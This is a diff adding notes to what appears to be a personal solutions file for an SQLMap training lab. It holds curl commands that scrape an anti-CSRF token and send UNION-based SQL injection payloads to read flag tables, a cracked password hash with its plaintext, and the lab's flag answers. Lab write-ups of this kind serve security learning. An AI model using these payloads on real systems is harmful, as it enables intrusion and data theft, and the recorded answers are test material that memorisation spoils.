@@ -184,3 +184,20 @@ Q1 column with "style": sqlmap --search -C style -> information_schema.ROUTINES.
 ANSWER: PARAMETER_STYLE
 Q2 Kimberly password: users table -> name=Kimberly Wright, password hash d642ff0feca378666a8727947482f1a4702deba0 cracked -> Enizoom1609
 ANSWER: Enizoom1609
+
+---
+# SQLMap Essentials - Cases 8 & 9 (target 154.57.164.79:40261)
+
+## Case 8 - anti-CSRF token (POST id + hidden field t0ken)
+Need cookie session + matching token (token tied to PHPSESSID):
+  rm -f /tmp/cj8.txt
+  TOK=$(curl -s -c /tmp/cj8.txt ".../case8.php" | grep -oP "name='t0ken' value='\K[^']+")
+  curl -s -b /tmp/cj8.txt -X POST ".../case8.php" \
+    --data-urlencode "id=0 union select 1,2,3,4,5,(select content from flag8)" \
+    --data-urlencode "t0ken=$TOK"
+ANSWER flag8: HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
+
+## Case 9 - unique uid (GET id + uid; uid must be 9-digit AND unused)
+  U=$(shuf -i 100000000-999999999 -n1)
+  curl ".../case9.php?id=0 union select 1,2,3,4,5,(select content from flag9)&uid=$U"
+ANSWER flag9: HTB{700_much_r4nd0mn355_f0r_my_74573}
